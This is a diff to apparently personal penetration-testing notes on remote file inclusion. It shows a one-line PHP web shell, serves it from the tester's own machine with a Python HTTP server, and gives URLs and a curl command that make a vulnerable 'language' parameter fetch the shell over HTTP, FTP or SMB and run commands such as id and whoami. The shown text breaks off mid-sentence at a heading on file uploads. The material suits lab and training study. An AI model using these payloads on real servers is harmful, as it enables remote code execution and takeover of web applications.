@@ -138,5 +138,20 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 Then, we host it under a port we choose, we can do it with python http server / goshs server:
 ```
-sudo python3 -m http.server <LISTENING_PORT>
+sudo python3 -m http.server 7418
 ```
+Then we access our malicious file in a way similar to our example:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:7418/shell.php&cmd=id
+```
+
+In case the protocol got blocked, we can use other protocols like ftp / smb, to do so we just need to host a ftp /smb server instead and access accordingly:
+```
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
+#or
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
+
+LFI and File Uploads:
+
+If we can 
